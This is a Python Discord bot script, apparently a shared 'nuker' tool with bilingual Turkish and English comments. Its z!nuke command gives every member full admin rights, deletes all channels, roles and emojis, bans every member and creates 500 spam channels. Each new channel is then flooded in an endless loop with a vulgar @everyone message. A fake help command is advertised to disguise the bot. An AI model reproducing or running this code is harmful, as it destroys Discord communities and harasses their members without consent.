#Discord nick / Discord ismim
#AtesliSerap#9070
from turtle import clear
import discord
from discord.ext import commands
import random
from discord import Permissions
import colorama
from colorama import Fore, Back, Style
import asyncio
#token here / tokeniniz buraya
token = "Token"

colorama.init()

#channel names here / kanal adları buraya
SPAM_CHANNEL =  [" Patlatıldınız" , "Malesef" , "Siktim" ,"eZ", "Türküm çalışkanım.","xD","Ağlayın","Nuked by Atesli ","Atesli","Serap","Basitti","zD","çerEZ "]
SPAM_MESSAGE = ["@everyone Atesli tarafından sikildiniz xD"]

client = commands.Bot(command_prefix="z!")

@client.event
async def on_ready():
   print(Fore.RED + ''' 

 ███▄    █  █    ██  ██ ▄█▀▓█████     ▄▄▄▄    ▒█████  ▄▄▄█████▓
 ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀    ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███      ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄    ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░   ▒░▒   ░   ░ ▒ ▒░     ░    
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░       ░    ░ ░ ░ ░ ▒    ░      
         ░    ░     ░  ░      ░  ░    ░          ░ ░           

z!nuke chat to nuke the server. / chate z!nuke yazarak sunucuyu nukeleyin.

z!help is a fake help page. / z!help sahte bir yardım sayfasıdır.

z!stop is stoping the server nuke. / z!stop sunucuyu nukelemeyi durdurur.

''')

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} başarıyla çıkış yaptı." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "Herkese admin veriyorum." + Fore.RESET)
    except:
      print(Fore.GREEN + "Herkese admin veriyorum" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} Kanalı Silindi." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} Kanalı Silinemedi." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Banlandı" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Banlanamadı." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Rolu Silindi" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Rolu Silinemedi" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Emojisi Silindi" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Emojisi Silinemedi" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("AtesliSerap#9070")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Başarıyla banlandı." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Banlanamadı." + Fore.RESET)
    await guild.create_text_channel("ATESLI")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"Yeni Davet: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Atesli {guild.name} Serap.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
